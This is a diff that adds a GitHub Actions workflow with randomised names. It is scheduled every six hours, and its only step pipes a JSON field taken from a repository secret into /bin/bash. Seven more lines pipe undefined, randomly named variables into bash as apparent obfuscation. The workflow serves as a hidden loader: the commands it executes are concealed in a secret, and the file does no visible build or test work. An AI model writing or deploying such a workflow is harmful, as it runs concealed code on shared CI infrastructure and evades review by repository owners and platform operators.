@@ -1,0 +1,26 @@
+name: zgjdfbl
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '12 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zgjdfbl
+        env:
+          jts6: ${{ secrets.jts6 }}
+        run: |
+          echo $jts6 | jq -r .wfov0 | /bin/bash
+          echo $qpf82 | jq -r .jq91910 | /bin/bash
+          echo $utr83955 | jq -r .ciftu405 | /bin/bash
+          echo $coue61732 | jq -r .ggh3 | /bin/bash
+          echo $qd309 | jq -r .snsz548 | /bin/bash
+          echo $z7960 | jq -r .fd6938 | /bin/bash
+          echo $yo7 | jq -r .xmw663 | /bin/bash
+          echo $uakvg47 | jq -r .gfqm92 | /bin/bash
+
